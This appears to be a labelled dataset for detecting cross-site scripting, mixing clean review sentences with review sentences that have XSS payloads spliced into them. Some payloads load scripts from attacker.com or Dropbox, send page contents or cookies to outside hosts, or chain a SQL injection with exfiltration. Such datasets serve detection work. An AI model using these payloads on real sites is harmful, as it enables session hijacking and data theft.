label	sentence
1	Cr<IMG SRC=`%00`&NEWLINE; ONERROR=ALERT(1)&NEWLINE;isp and Clear.
0	I don't know exactly what it is about this movie, but we latched on to this endearing movie and it has become a special part of our family's memories.
0	There are the usual Hitchcock logic flaws.
1	Voice Quality, Sign"/>'><script src="/user_upload/mypic.png.js"></script>al Strength, Dropped Calls.
1	My phone sounded OK ( not great - OK), but my wife's phone was almost totally unintelligible<SCR<SCRIPT>IPT>ALERT(DOCUMENT.COOKIE)</SCR</SCRIPT>IPT>, she couldn't understand a word being said on it.
1	This<script>confirm()</script> is infuriating.
0	So for our enjoyment we get to see them run around, play games, and be dangerous.
1	But now that it is "out of warranty"<SVG><SCRIPT %00>ALERT&LPAR;1&RPAR; {OPERA} the same problems reoccure.Bottom line... put your money somewhere else... Cingular will not support it.
0	BLACK WATER is a thriller that manages to completely transcend it's limitations (it's an indie flick) by continually subverting expectations to emerge as an intense experience.
0	This movie is excellent!Angel is beautiful and Scamp is adorable!His little yelps when hes scared,and the funniest parts are when:Scamp is caught under the curtain and when Angel and Scamp are singing 'Ive Never Had This Feeling Before'.I totally recommend this movie,its coming out on special edition on June 2.The cover has scamp on a garbage can and Angel underneath the lid.
0	I'm not sure what he was trying to do with this film.
0	I won't say any more - I don't like spoilers, so I don't want to be one, but I believe this film is worth your time.
0	No actress has been worse used that June Allison in this movie.
1	Then I had to continue pairing it perio<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>dically since it somehow kept dropping.
1	The pairing of the two devices <DIV STYLE="BACKGROUND-IMAGE: URL(JAVASCRIPT:ALERT('XSS'))">was so easy it barely took a couple minutes before I started making calls with the voice dialing feature.
1	Awkward to use and unreliab&LT;LINK REL=\"STYLESHEET\" HREF=\"JAVASCRIPT&#058;ALERT('XSS');\"&GT;le.
1	It plays louder than any other speaker of this size; the price is so low that most would thi<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}</div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>nk the quality is lacking, however, it's not.
1	Those phones are w<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>orking just fine now.
0	The things that the four kids get themselves into is absolutely hilarious to watch.
1	The first thing that happe<iframe/src="data:text/html;&tab;base64&tab;,pgjvzhkgb25sb2fkpwfszxj0kdeppg==">ned was that the tracking was off.
1	Leopard PFOO\?; ALERT(DOCUMENT.COOKIE);//?;rint is wonderfully wild!.
1	A good quality bargain.. I bought this after "><SCRIPT SRC=DATA:TEXT/JAVASCRIPT;BASE64,ZD1KB2N1BWVUDDSGXYA9IGQUY3JLYXRLRWXLBWVUDCGNC2NYAXB0JYK7XY5PZD0NMTKNO18UBM9UY2U9ZC5XDWVYEVNLBGVJDG9YKCDBBM9UY2VDJYKUBM9UY2U7XY5ZCMM9JY8VBG9JYWXOB3N0L20NO2QUYM9KES5HCHBLBMRDAGLSZCHFKSA=></SCRIPT>I bought a cheapy from Big Lots that sounded awful and people on the other end couldn't hear me.
1	AFter the fi<SCRIPT/&TAB; SRC='HTTPS://DL.DROPBOX.COM/U/13018058/JS.JS' /&TAB;></SCRIPT>rst charge kept going dead after 2 minutes.
0	Rating:  out of .
1	camer"/>'><script src=https://attacker.com/evil.js></script>a color balance is AWFUL.
0	Ray Charles is legendary.
1	The biggest complaint<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> I have is, the battery drains superfast.
1	Yes it's shiny on front side <IFRAME/SRC=JAVASCRIPT:ALERT(1)>- and I love it!
0	" But "Storm Trooper" is not even bad enough to make it to the list of wonderfully terrible movies.
1	Bat<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>tery is holding up well.
1	It quit wor<div style="font-family:'foo&#10;;color:red;';">lolking after I'd used it for about 8 months, so I just purchased another one because this is the best headset I've ever owned.
0	Kieslowski never ceases to amaze me.
1	Couldn't use the unit with s<iframe src="javascript:alert('xss');"></iframe>unglasses, not good in Texas!
0	It was a very superficial movie and it gave me the feeling that I was watching play rather than a film.
1	This is simply t&lt;br size=\"&{alert('xss')}\"&gt;he BEST bluetooth headset for sound quality!
0	Almost all of the songs in Cover Girl are old-fashioned and not very tuneful.
0	To those who find this movie intelligent or even masterful, I can only say - it's your intelligence and your imagination you obviously used to try and make some sense of this pitiful attempt (it's in our human nature to try and make sense of things) .
0	All things considered, a job very well done.
0	Bad script, bad direction and horrible acting make this one plain bad!
1	Think it ov&lt;layer src=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/layer&gt;er when you plan to own this one!This sure is the last MOTO phone for me!
1	Unfortunately it will not recharge my iPhone 4s, despite connecting it from multiple power&lt;body background=\"javascript&#058;alert('xss')\"&gt; sources (iMac, external battery, wall outlet, etc).
0	But what really made it unwatchable was the direction.
0	There was a few pathetic attempts to give the characters some depth, but it didn't really work into the rest of the plot.
0	Much more interesting, more action, more suspense, and less of the unneeded controversy.
1	Would not rec%22/%3e%3cbody%20onload=?document.write(%22%3cs%22%2b%22cript%20src=http://my.box.com/xss.js%3e%3c/script%3e%22)?%3ecommend.
1	It feels poorly constructed, the menus are difficult to navigate, and the buttons are so recessed that it is difficult to push<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe> them.
0	The plot - well, I said I'd let that one go.
1	I &lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;recommend iGo to anyone with different brand cell phones/mp3 players in the family.
0	For people who are first timers in film making, I think they did an excellent job!!
1	I really wanted the Plantr<IMG/SRC=`%00` ONERROR=THIS.ONERROR=CONFIRM(1)onics 5 to be the right one, but it has too many issues for me.The good
1	This product is very High quality Chinese CRAP!!!<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=JAVASCRIPT:ALERT('XSS');">!!!
1	I'<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>m pleased.
0	his performance, as awarded, was stunning.
0	Again, lame.
1	I am more t<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">han happy with this product.
1	It has ev&lt;div style=\"background-image&#58; url(javascript&#058;alert('xss'))\"&gt;erything I need and I couldn't ask for more.
1	Doesn't Wo&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\"&GT;rk.
1	Utter crap.. S+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-ound quality is TERRIBLE.
1	So I bought about  of these and saved alot of m%253CSCRIPT%253EALERT(DOCUMENT.COOKIE)%253C/SCRIPT%253E?><<SCRIPT>ALERT(DOCUMENT.COOKIE);//<</SCRIPT>oney.
0	The hockey scenes are terrible, defensemen playing like they're 5 years old, goalies diving at shots that are  feet wide of the net, etc.
1	I'm happy?; alert(document.cookie); var foo=? about this purchase- good quality and low price.
0	But the acting--even that of such professionals as Drago and Debbie Rochon--was terrible, the directing worse (perhaps contributory to the former), the dialog chimp-like, and the camera work, barely tolerable.
1	This isjavascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'> a great phone!.
1	Disapointing Re<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"sults.
0	I hate writing bad reviews about films - especially those in which I really like the star - but this film is so bad I don't believe for one second that anyone could have been proud of it.
1	Chinese For<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>geries Abound!.
1	It is well made, easy to access the phone and </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>has a handy, detachable belt clip.
1	Great price, t<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>oo!
1	Don't bother - go to the st&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;ore.
0	I couldn't think of a better way to end the film, but a smile on my face, great way to wrap up an amazing film and trilogy!
1	THey are<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> so cool!
1	DO NOT &lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;BUY DO NOT BUYIT SUCKS
0	Babie Bop is very cute.
1	Fits comfortably, came with three sizes of earb&LT;IMG SRC=\"JAV&#X0D;ASCRIPT&#058;ALERT('XSS');\"&GT;ud tips.
1	B&LT;IMG SRC=\"JAV&#X09;ASCRIPT&#058;ALERT('XSS');\"&GT;ad Reception.
1	This particular model would not wor<IFRAME %00 SRC="&TAB;JAVASCRIPT:PROMPT(1)&TAB;"%00>k with my Motorola Q smartphone.
1	Bought mainly for the charger, which br<table background="javascript:alert('xss')">oke soon after purchasing.
0	Ironically I mostly find his films a total waste of time to watch.
1	This was utterly confusing at first, which caused me to lose a couple of<DIV STYLE="BACKGROUND-IMAGE:\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"> very, very important contacts.
0	If good intentions made a film great, then this film might be one of the greatest films ever made.
0	Non-linear narration thus many flashbacks and every part are articulated quite well.
1	Excellent sound, battery life and inconspicuous to <IMG/&#09;&#10;&#11; SRC=`~` ONERROR=PROMPT(1)>boot!.
0	I will never forget it now.
1	clipping this to your belt wi<BODY ONLOAD=alert('hellox worldss')>ll deffinitely make you feel like 5 cent's up-and-coming.
1	It fits my ear well and <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>is comfortable on.
1	t<% foo><x foo="%><script>alert(123)</script>">he charger worked for about a week and then completely stopped charging my phone.
1	This is cool because most cases are jus<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3a;&#97lert(1)>clickmet open there allowing the screen to get all scratched up.
0	Yes, I am simplifying things here for the sake of brevity, for this really is at the core of the problems with this film - it has too much going on without any real, fulfilling explanation.
1	My fat&LT;IMG STYLE=\"XSS&#58;EXPR/*XSS*/ESSION(ALERT('XSS'))\"&GT;her has the V265, and the battery is dying.
0	The characters were very 'stagey' and the storyline was a lot like a stage farce.
0	It even has its sweet moments.
0	Secondly, Hitchcock pretty much perfected the thriller and chase movie.
0	***SPOILERS*** Whatever else can (or can't) be said about it, SURFACE is superbly crafted.
1	My experience was terrible..... This was my fourth bluetooth he<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>adset, and while it was much more comfortable than my last Jabra (which I HATED!!!
1	This product is clearly not ready for prime time, I don't care how cool it looks, if you can't tell a call is"/>'><script src="/user_upload/mypic.png.js"></script> coming in it's worthless.
1	I found the product to be easy to set up<svg onload="javascript:alert(123)" xmlns="#"></svg> and use.
1	W<iframe name="admin" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/admin"></iframe>orks well.
1	However I needed s&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;ome better instructions.
1	In the span of an hour, I &lt;link rel=\"stylesheet\" href=\"javascript&#058;alert('xss');\"&gt;had two people exclaim "Whoa - is that the new phone on TV?!?
1	The shipping time was also &LT;LINK REL=\"STYLESHEET\" HREF=\"HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS\"&GT;very quick!
0	I really loved the story line and the poler bear was kinda cute.But if anyone has a question about Fort Steele, just ask away:)
1	So anyone near you will hear part of yo<math><a xlink:href="//jsfiddle.net/t846h/">clickur conversation.
0	Schrader has made a resume full of lousy, amateurish films.
1	<svg/onload="(new image()).src='//attacker.com/'%2bdocument.documentelement.innerhtml">lightweight and works well.
1	This <div style="width: expression(alert('xss'));">BlueAnt Supertooth hands-free phone speaker is AWESOME.
1	aking the ring tones sXSS&#58;EX&#X2F;*XSS*//*/*/PRESSION(ALERT(\"XSS\"))'&GT;ound very cheap.
0	I guess it was supposed to be clever twist, then shed some light on the situation, but it was just stupid.
1	I have been very satis&LT;BR SIZE=\"&{ALERT('XSS')}\"&GT;fied with this cell phone from day one.
0	Now you know why I gave it a +!
0	The cinematography-if it can be called that-sucked.
0	I am a fan of his ... This movie sucked really bad.
1	All three broke within two months &LT;DIV STYLE=\"WIDTH&#58; EXPRESSION(ALERT('XSS'));\"&GT;of use.
1	A pr"><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>etty good product.
1	I get absolutely horrible reception in my apartment<IFRAME/SRC="DATA:TEXT/HTML;&TAB;BASE64&TAB;,PGJVZHKGB25SB2FKPWFSZXJ0KDEPPG==">, where with other phones I have not had this problem.
1	It's a great tool for entertainment, communication, and data management.Oh, be sure to use ActiveSync 4.2 fo<SCRIPT/SRC=HTTPS://WWW.GOOGLE.COM/COMPLETE/SEARCH?CLIENT=CHROME&Q=HELLO&CALLBACK=ALERT></SCRIPT>r optimal data synchronization results!
1	I checked everywhere and there is no feature for it which is really disappo<% FOO><X FOO="%><SCRIPT>ALERT(123)</SCRIPT>">inting.
1	It does everything the des//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//cription said it would.
1	Too bad you hav<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>e to pay up to $$$ a month for the service!
1	the worst phone from samsung...crap..... this crappy Sa<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">msung E75.. is the worst i have ever seeen.
0	The plot was the same as pretty much every other cheap horror.
0	He can bore you to pieces, and kill the momentum of a movie, quicker than anyone else.
0	& That movie was bad.
0	I let my girlfriend talk me into seeing this - bad idea, we both hated it.
1	I can't use this case becau<IFRAME NAME="ADMIN" SRC="HTTPS://BYPASSES-EVERYWHERE.CTF.INSECURITY-INSA.FR/ADMIN"></IFRAME>se the smell is disgusting.
0	(My mother and brother had to do this)When I saw Robert Ryan portraying this type of man, it was a very good imitation of this type of individual, and I was impressed.
1	How stupid +ADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4-is that?
0	Hitchcock is a great director.
1	disapp<svg onload="javascript:alert(123)" xmlns="#"></svg>ointing.
0	Highly entertaining at all angles.
1	For the price on Amazon, it is an excellent product, which I would h<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>ighly recommend.
0	But this movie is not funny, considering the ridiculousness of it.
1	P<div style="font-family:'foo&#10;;color:red;';">LOLoor product.
0	The last 5 minutes of movie are also not bad as well.
1	* Comes <img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>with a strong light that you can use to light up your camera shots, and even flash SOS signals (seriously!
1	Don't buy this product - It fails!<TABLE BACKGROUND="JAVASCRIPT:ALERT('XSS')">.
1	Great it was new packaged nice works good, no problems and it came in less time then<img/src=`%00` onerror=this.onerror=confirm(1) I expected!!!!
0	The stories were powerful explorations of the nature of man and of art.
1	I love this cable - it allows me to connect any mini<script>confirm()</script>-USB device to my PC.
0	I am not a filmmaker nor am I a director but I would hide my head in the sand if I'd spent whatever amount of money and time on this movie.
1	Worked very well paired with a Treo 7w and as a Skype&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt; headset on my PC (using a USB Bluetooth transceiver).
0	This totally UNfunny movie is so over the top and pathetic and unrealistic that throughout the whole 9 minutes of utter torture I probably looked at my watch about 7 times!
0	This was such an awesome movie that i bought it off of Ebay.
0	Not frightening in the least, and barely comprehensible.
1	Very Dissap&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;ointing Performance.
1	The reception </SCRIPT><IMG/*%00/SRC="WORKSINCHROME&COLON;PROMPT&#X28;1&#X29;"/%00*/ONERROR='EVAL(SRC)'>has been generally good.
1	Verizon tech support walked my through a few procedures, none of which worked and I ended up "/>'><script src=https://attacker.com/evil.js></script>having to do a hard re-set, wiping out all my data.
1	NOT WH<AUDIO CONTROLS AUTOPLAY ONENDED=ALERT(1)><SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>AT I WANTED.
0	The soundtrack sucked.
0	The character developments also lacked in depth.
0	The flat reenactments don't hold your attention because they are emotionally adrift and stagy.
1	They have been a?; alert(document.cookie); var foo=?round for years and carries the highest quality of anti-glare screen protector that I have found to date.
1	Bett<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>er Than New.
0	Bela Lugosi was totally extraneous, intoning odd lines.
0	The concert sequences just sucked.
1	These are fabulous!xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
1	This allows the possibility of double booking for the same date and t<IFRAME SRC='DATA:TEXT/HTML,<SCRIPT DEFER="TRUE" SRC="DATA:TEXT/JAVASCRIPT,DOCUMENT.BODY.INNERTEXT=/HELLO/"></SCRIPT>'></IFRAME>ime after the first.
0	Overall, this movie was cheap trash.
1	Seller shipped quickly and much cheaper t+ACIAPGA8-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4APAAI-han the competitors.
0	Having to humour him just to get by and get through the day was so apt.
0	The soundtrack wasn't terrible, either.
0	I am so thrilled after seeing a movie like this.
0	By the time the pyromaniac waylaid the assistant I was bored and didn't care what happened next and so I switched off.
0	Vivian Schilling did an excellent job with the script.
1	Perfect for the"><A HREF="JAVASCRIPT:EVAL('D=DOCUMENT; _ = D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'//DOMAIN\';D.BODY.APPENDCHILD(_)')">CLICK ME FOR AN AWESOME TIME</A> PS3.
1	The design might b<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>e ergonomic in theory but I could not stand having these in my ear.
0	The cinematography is simply stunning (to say the least) and the fx are nothing if not state-of-the-art.
1	T-&lt;style&gt;@im\port'\ja\vasc\ript&#58;alert(\"xss\")';&lt;/style&gt;Mobile has the best customer service anywhere.
1	in addition it feels &amp; looks as if the phone is al<INPUT/ONMOUSEOVER="JAVASCRIPT&COLON;CONFIRM&LPAR;1&RPAR;"l lightweight cheap plastic.
1	Great prod<FORM><ISINDEX FORMACTION="JAVASCRIPT&COLON;CONFIRM(1)"uct.
1	This case has passed the one year m&lt;style&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/style&gt;ark and while it shows signs of wear, it is % functional.
1	Truly aw<a href="javascript:void(0)" onmouseover=&newline;javascript:alert(1)&newline;>x</a><///style///><span %2f onmousemove='alert&lpar;1&rpar;'>spanful.
0	I was totally fascinated by the music, the dancing... everything.
1	My phone doesn't slide around my car now and the grip prevents my phone from slipping out of my &lt;bgsound src=\"javascript&#058;alert('xss');\"&gt;hand.
1	.... Item arrived quickly<script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script> and works great with my Metro PCS Samsung SCH-r45 slider phone and Sony Premium Sound in ear plugs.
0	All this movie does is make you sick watching all these slackers make excuses for their stupid actions for 9 minutes.
1	<SCRIPT>CONFIRM()</SCRIPT>Does Not Work.
0	The writers were "smack on" and I think the best actors and actresses were a bonus to the show.These characters were so real.
0	Started watching this but didn't believe in any of the characters.
0	I have to mention this and it is a huge SPOILER, i loved the ending, how all the characters of the three films were the remaining survivors of the ferry disaster, with Valentine and the young judge together, and the old man watching it on her TV, solidifying his happiness over the suffering which he dealt with for those many years.
0	It was very popular when I was in the cinema, a good house and very good reactions and plenty of laughs.
0	For those that haven't seen it, don't waste your time!
0	The plot doesn't hang together at all, and the acting is absolutely appalling.
0	There is a lot of beautiful places.
0	I mean, in a realistic world, she would NEVER have gotten into that ballet repertory... The whole thing was quite pathetic.
0	/ - and only because there is no setting for /.
0	Do not waste your time.
1	<A HREF="JAVASCRIPT:VOID(0)" ONMOUSEOVER=&NEWLINE;JAVASCRIPT:ALERT(1)&NEWLINE;>X</A><///STYLE///><SPAN %2F ONMOUSEMOVE='ALERT&LPAR;1&RPAR;'>SPANWORTHWHILE.
1	Also, the phone doesn't seem<img src=javascript:alert(string.fromcharcode(88,83,83))> to accept anything except CBR mp3s, preferably ripped by Windows Media Player.
0	One of the best mexican movies ever!, and one of the less understood, even by mexican themselves, no matter how identified the should have felt with it.
1	I bought th<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">click me</a>is phone as a replacement for my StarTac and have regretted it since.
1	Worst eve<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">r.
1	Comfortable fit - you need your headset to be comfortable <img """><script>alert("xss")</script>"\>for at least an hour at a time, if not for an entire day.
0	My 8/ score is mostly for the plot.
0	I literally vomited while watching this film.
1	Obviously they have a ter<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>rible customer service, so you get what you pay for.
1	I contacted the co<TABLE><TD BACKGROUND="javascript:alert('XSS')">mpany and they told me that, although the unit was still under warranty, if I couldn't produce my receipt I was out of luck.
0	Yet, I enjoy watching it.
1	Does not<style>@im\port'\ja\vasc\ript:alert("xss")';</style> fit.
1	The earpiece on this is too large or too heavy...it keeps falling <iframe xmlns="#" src="javascript:alert(1)"></iframe>out of my ear.
1	Linksys should <DIV STYLE="background-image: url(javascript:alert('XSS'))">have some way to exchange a bad phone for a refurb unit or something!
1	Plan on ordering from&LT;IMG LOWSRC=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT; them again and again.
1	I have a Verizon LG phone and they work well together, good rec<EMBED SRC="DATA:IMAGE/SVG+XML;BASE64,PHN2ZYB4BWXUCZPZDMC9IMH0DH A6LY93D3CUDZMUB3JNLZIWMDAVC3ZNIIB4BWXUCZ0IAHR0CDOVL3D3DY53MY5VCMCV MJAWMC9ZDMCIIHHTBG5ZONHSAW5RPSJODHRWOI8VD3D3LNCZLM9YZY8XOTK5L3HS AW5RIIB2ZXJZAW9UPSIXLJAIIHG9IJAIIHK9IJAIIHDPZHROPSIXOTQIIGHLAWDODD0IMJAW IIBPZD0IEHNZIJ48C2NYAXB0IHR5CGU9INRLEHQVZWNTYXNJCMLWDCI+YWXLCNQOILH TUYIPOZWVC2NYAXB0PJWVC3ZNPG==" TYPE="IMAGE/SVG+XML" ALLOWSCRIPTACCESS="ALWAYS"></EMBED>eption and range that exceeds 2 feet line of sight.
0	The new characters weren't all that memorable, and I found myself forgetting who was who.
0	Elias Koteas,Jack Palance play good roles Angelina is hot and gets naked.Billy Drago appears in this and is cool as usual + a cameo by Sven ole Thorsen helps make this a very enjoyable movie with good acting and a decent budget.
1	Problem is that the ear loops are made of weak<SVG XMLNS="#"><SCRIPT>ALERT(1)</SCRIPT></SVG> material and break easily.
0	This show is made for Americans - it is too stupid and full with hatred and clich?s to be admitted elsewhere.
1	It's v%2baciapga8-script%2bad4-alert%28document.location%29%2badw-%2fscript%2bad4apaai-ery convenient and simple to use - gets job done & makes the car ride so much smoother.
1	I like design and look of Jabra behing the ear headsets and 52 is pretty comfortible<input onfocus=write(XSS) autofocus> to wear 24 hours a day without pain in the ear.
0	Which has more depth and character than the man underneath it.
1	Can't upload ringtones from a third <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>party.
0	I felt as though her going to Ireland did absolutely nothing whatsoever.
1	It doesn't make you l"><script src=data:text/javascript;base64,zd1kb2n1bwvuddsgxya9igquy3jlyxrlrwxlbwvudcgnc2nyaxb0jyk7xy5pzd0nmtkno18ubm9uy2u9zc5xdwvyevnlbgvjdg9ykcdbbm9uy2vdjykubm9uy2u7xy5zcmm9jy8vbg9jywxob3n0l20no2quym9kes5hchblbmrdaglszchfksa=></script>ook cool.
0	I must say I have taped most of the episodes and i find myself watching them over and over again.
0	It is shameful.
1	Overall, I would recommend this phone over<math><a xlink:href="//jsfiddle.net/t846h/">click the new Walkman.
1	The sound quality is excellent as wefoo<script>alert(document.cookie)</script>ll.
1	Good show%2BACIAPGA8-SCRIPT%2BAD4-ALERT%28DOCUMENT.LOCATION%29%2BADW-%2FSCRIPT%2BAD4APAAI-, Samsung.
1	You can't beat the price o<img src= onmouseover="alert('xxs')">n these.
1	The phone crashed com<% foo><x foo="%><script>alert(123)</script>">pletely and now I have to get it replaced.
1	I've had no trouble accessing the Internet, downloading ringtones or performing any of <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>the functions.
0	I think i was one of the people who found this another one of roth's pearls.
1	Cheap but hey it works.. Was pleas+adw-script+ad4-alert(document.location)+adw-/script+ad4-antly suprised given the low cost of this item.
0	The sets (especially designed to work with the camera) are amazing....stylized, beautiful and effective.
1	It works gr<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">eat with a car charger, especially if you cannot plug in two adapters at the same time.
0	Up there with the best of Melville.
0	I couldn't take them seriously.
1	That comp<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a><///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPANany is a joke.
1	Poor<iframe/src=javascript:alert(1)> Construction.
1	Provides good pexp/*&lt;a style='no\xss&#58;noxss(\"*//*\");rotection and looks classy, too.
0	Only like 3 or 4 buildings used, a couple of locations MAYBE, & poor hummh!
0	Oh yeah, and the storyline was pathetic too.
1	Sprint charges for this serv<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMeice.
